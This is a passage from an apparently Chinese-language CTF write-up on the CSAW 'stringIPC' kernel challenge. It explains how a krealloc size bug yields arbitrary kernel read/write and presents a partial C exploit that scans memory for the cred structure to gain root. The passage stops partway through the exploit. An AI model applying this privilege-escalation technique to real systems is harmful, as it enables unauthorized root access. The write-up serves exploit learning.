get_channel_by_id(state, id);</span><br><span class="line">    <span class="keyword">if</span> ( IS_ERR(channel) )</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(channel);</span><br><span class="line">    <span class="keyword">if</span> ( grow )</span><br><span class="line">        new_size = channel-&gt;buf_size + size;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        new_size = channel-&gt;buf_size - size;</span><br><span class="line">    new_data = krealloc(channel-&gt;data, new_size + <span class="number">1</span>, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> ( new_data == <span class="literal">NULL</span> )  <span class="comment">// 定义的出错条件</span></span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    channel-&gt;data = new_data;</span><br><span class="line">    channel-&gt;buf_size = new_size;</span><br><span class="line">    ipc_channel_put(state, channel);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述函数调用<code>krealloc</code>对请求进行重新分配大小。LINUX内核中<code>krealloc</code>实现如下(mm/slab_common.c)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * krealloc - reallocate memory. The contents will remain unchanged.</span></span><br><span class="line"><span class="comment">     * @p: object to reallocate memory for.</span></span><br><span class="line"><span class="comment">     * @new_size: how many bytes of memory are required.</span></span><br><span class="line"><span class="comment">     * @flags: the type of memory to allocate.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The contents of the object pointed to are preserved up to the</span></span><br><span class="line"><span class="comment">     * lesser of the new and old sizes.  If @p is %NULL, krealloc()</span></span><br><span class="line"><span class="comment">     * behaves exactly like kmalloc().  If @new_size is 0 and @p is not a</span></span><br><span class="line"><span class="comment">     * %NULL pointer, the object pointed to is freed.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">krealloc</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *p, <span class="type">size_t</span> new_size, <span class="type">gfp_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ret;</span><br><span class="line">    <span class="keyword">if</span> (unlikely(!new_size)) &#123;</span><br><span class="line">        kfree(p);</span><br><span class="line">        <span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = __do_krealloc(p, new_size, flags);</span><br><span class="line">    <span class="keyword">if</span> (ret &amp;&amp; p != ret)</span><br><span class="line">        kfree(p);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(krealloc);</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line"><span class="comment">// 对于ZERO_SIZE_PTR，解释如下  (include/linux/slab.h)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ZERO_SIZE_PTR will be returned for zero sized kmalloc requests.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Dereferencing ZERO_SIZE_PTR will lead to a distinct access fault.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * ZERO_SIZE_PTR can be passed to kfree though in the same way that NULL can.</span></span><br><span class="line"><span class="comment"> * Both make kfree a no-op.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZERO_SIZE_PTR ((void *)16</span></span><br></pre></td></tr></table></figure><p>在上面看到，当new_size为0时，原先指针将被free掉，并返回一个可以被free但是不能被解引用的返回值<code>((void *)16</code>。但是注意到IPC中定义的出错条件是realloc返回值为NULL，不是这里的16。<strong>如果我们传入size为-1，首先由于size_t是无符号类型，将被解释为0xfffff…ffff，其次，这里将size+1之后realloc将返回一个非NULL的指针，说明可以分配成功。于是我们拿到了一个0xfffff…ffff的缓冲区，也就是任意地址读写的权限</strong></p><p>也就是说，我们现在拥有了内核地址空间任意读写的条件。那么该怎么利用呢？这里参考<a href="https://xz.aliyun.com/t/3204">链接</a>的三种方法，进行逐一的复现。</p><h1 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h1><h2 id="方法一：劫持cred结构体"><a href="#方法一：劫持cred结构体" class="headerlink" title="方法一：劫持cred结构体"></a>方法一：劫持cred结构体</h2><p>前面几篇文章中也能看出来，cred结构体中定义了进程的权限。如果能够设置uid,gid等全为0，也就直接获得了root权限。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="type">unsigned</span>    securebits; <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_bset;   <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   jit_keyring;    <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">                     * keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="type">void</span>        *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>   <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>回想之前<a href="https://nicholas-wei.github.io/2022/01/31/kernel-3-UAF/">内核UAF</a>和<a href="https://nicholas-wei.github.io/2022/01/24/kernel-2-stkof/">内核栈溢出</a>中是如何修改cred结构体的。前者是知道了cred大小之后利用指针未清零导致的UAF，后者是直接执行的commit_cred(prepare_cred(0))，但是需要依靠栈溢出覆盖执行流。然而这里不存在溢出，也不会显示返回，也就无法改变执行流。如果这里想要劫持cred结构体，必须知道cred结构体的位置。</p><p>这里给出一种方法：修改task_struct中的char comm[TASK_COMM_LEN]结构。linux中prctl函数中的PR_SET_NAME功能，能够为线程设置16字节以下的名称。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PR_SET_NAME (since Linux <span class="number">2.6</span><span class="number">.9</span>)</span><br><span class="line">    Set the name of the calling thread, using the value in the</span><br><span class="line">    location pointed to <span class="title function_">by</span> <span class="params">(<span class="type">char</span> *)</span> arg2.  The name can be up</span><br><span class="line">    to 16 bytes <span class="type">long</span>, including the terminating null byte.</span><br><span class="line">    <span class="params">(If the length of the <span class="built_in">string</span>, including the terminating</span></span><br><span class="line"><span class="params">     null byte, exceeds <span class="number">16</span> bytes, the <span class="built_in">string</span> is silently</span></span><br><span class="line"><span class="params">     truncated.)</span>  This is the same attribute that can be <span class="built_in">set</span></span><br><span class="line">    via <span class="title function_">pthread_setname_np</span><span class="params">(<span class="number">3</span>)</span> and retrieved using</span><br><span class="line">    <span class="title function_">pthread_getname_np</span><span class="params">(<span class="number">3</span>)</span>.  The attribute is likewise</span><br><span class="line">    accessible via /proc/self/task/[tid]/<span class="title function_">comm</span> <span class="params">(see proc(<span class="number">5</span>))</span>,</span><br><span class="line">where [tid] is the thread ID of the calling thread, as</span><br><span class="line">    returned by <span class="title function_">gettid</span><span class="params">(<span class="number">2</span>)</span></span><br></pre></td></tr></table></figure><p>接下来我们只需要知道cred的地址在哪里即可。由于name位置也在线程control block附近，通过在内存中爆破name位置就可以获得cred结构体地址信息了。我们一共需要爆破位于0xffff880000000000~0xffffc80000000000中的64T地址内的数据，相当大的工作量。。。以下脚本中仍有许多地方通过调试也无法知道是为什么。尤其是确定cred结构体位置的地方的判断条件。此外，在找到cred结构体之后，如果想对其写入，只能使用stringIPC提供的一次性写入一字节的方法，而不能一次性写入32字节，也是很迷惑。</p><p>下图为找到的cred结构体位置，我们将下图0x3e8地方改为0即可。</p><p><img src="/2022/02/15/kernel-5-bypass-smep1/image-20220216122608119.png" alt="image-20220216122608119"></p><p>以下为成功改为0时，也就是拿到了ROOT.</p><p><img src="/2022/02/15/kernel-5-bypass-smep1/image-20220216130310607.png" alt="image-20220216130310607"></p><p>此外，自己复现写的脚本似乎很不稳定。不知道为什么有时会找到0x0a地址的地方。需要多尝试几次。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span>       </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> <span class="comment">// for memmem</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span>    <span class="comment">/* BSD and Linux */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span> <span class="comment">// for getgid()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span> <span class="comment">// for system(&quot;/bin/sh&quot;)</span></span></span><br><span class="line"><span class="comment">// search string input</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_IOCTL_BASE     0x77617363</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> buf_size;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">grow_channel_args</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">loff_t</span> index;</span><br><span class="line">    <span class="type">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// create a channel</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/csaw&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open /dev/csaw error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">alloc_args</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">shrink_args</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_args</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_args</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> <span class="title">close_args</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_args</span>;</span></span><br><span class="line">    <span class="type">size_t</span> addr = <span class="number">0xffff880000000000</span>;</span><br><span class="line">    <span class="type">size_t</span> real_cred = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> cred = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> target_addr;</span><br><span class="line">    <span class="type">int</span> root_cred[<span class="number">12</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// alloc one</span></span><br><span class="line">    alloc_args.buf_size = <span class="number">0x100</span>;</span><br><span class="line">    alloc_args.id = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    ret = ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;alloc_args);</span><br><span class="line">    <span class="keyword">if</span>(alloc_args.id == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bad alloc\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] alloc an channel at id %d\n&quot;</span>,alloc_args.id);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// change its size to get arbitary write</span></span><br><span class="line">    shrink_args.id = alloc_args.id;</span><br><span class="line">    shrink_args.size = <span class="number">0x100</span>+<span class="number">1</span>; <span class="comment">// vul, shrink size is `original size - this size` si we get -1 here</span></span><br><span class="line">    ret = ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] now we have arbitary read/write\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use prctl() to set a str</span></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(buf,<span class="string">&quot;1@mnicholas_Wei&quot;</span>);</span><br><span class="line">    prctl(PR_SET_NAME,buf);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// BEGIN OUR SEARCH</span></span><br><span class="line">    <span class="type">char</span>* local_buf = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">for</span>(;addr&lt;<span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// use memmem to search for pattern</span></span><br><span class="line">        <span class="comment">// we can&#x27;t do memmem directly, because we need to search it inside</span></span><br><span class="line">        <span class="comment">// the space of **device**, not the space of our program.</span></span><br><span class="line">        <span class="comment">// printf(&quot;look for addr 0x%lx\n&quot;,addr);</span></span><br><span class="line">        seek_args.id = alloc_args.id;</span><br><span class="line">        seek_args.index = addr<span class="number">-0x10</span>; <span class="comment">// index is actually the begin of the place we want to search.</span></span><br><span class="line">        seek_args.whence = SEEK_SET; <span class="comment">// search from begin</span></span><br><span class="line">        ret = ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span><br><span class="line">        <span class="comment">// use channel_read to read channel&#x27;s space</span></span><br><span class="line">        read_args.buf = local_buf;</span><br><span class="line">        read_args.count = <span class="number">0x1000</span>;</span><br><span class="line">        read_args.id = alloc_args.id;</span><br><span class="line">        ret = ioctl(fd,CSAW_READ_CHANNEL,&amp;read_args);</span><br><span class="line">        <span class="comment">//now data is in local_buf</span></span><br><span class="line">        ret = memmem(local_buf,<span class="number">0x1000</span>,buf,<span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] user-level pointer @ 0x%lx\n&quot;</span>,ret);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] find pattern @ 0x%lx\n&quot;</span>,ret+addr);</span><br><span class="line">            cred = *(<span class="type">size_t</span> *)(ret - <span class="number">0x8</span>);</span><br><span class="line">            real_cred = *(<span class="type">size_t</span> *)(ret - <span class="number">0x10</span>);</span><br><span class="line">            <span class="keyword">if</span>((cred||<span class="number">0xff00000000000000</span>) &amp;&amp; (real_cred == cred)) <span class="comment">// what&#x27;s the meaning of this?</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// target_addr = addr+ret-(int)buf;// what&#x27;s meaning?</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[+] find cred @ 0x%lx\n&quot;</span>,cred);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[+] find real_cred @ 0x%lx\n&quot;</span>, real_cred);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// now we get the cred addr, we can overwrite it</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// The following way doesn&#x27;t work</span></span><br><span class="line">    <span class="comment">// //1. seek</span></span><br><span class="line">    <span class="comment">// seek_args.id = alloc_args.id;</span></span><br><span class="line">    <span class="comment">// seek_args.index = cred + 8 - 0x10;</span></span><br><span class="line">    <span class="comment">// printf(&quot;[+] switch to search @ %llx\n&quot;,seek_args.index);</span></span><br><span class="line">    <span class="comment">// seek_args.whence = 0;//from begin</span></span><br><span class="line">    <span class="comment">// ret = ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span></span><br><span class="line">    <span class="comment">// // 2.write</span></span><br><span class="line">    <span class="comment">// char payload[32] = &#123;0&#125;;</span></span><br><span class="line">    <span class="comment">// write_args.buf = payload;</span></span><br><span class="line">    <span class="comment">// write_args.count = 32;</span></span><br><span class="line">    <span class="comment">// write_args.id = alloc_args.id;</span></span><br><span class="line">    <span class="comment">// ret = ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_args);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// the solution on website, works well</span></span><br><span class="line">        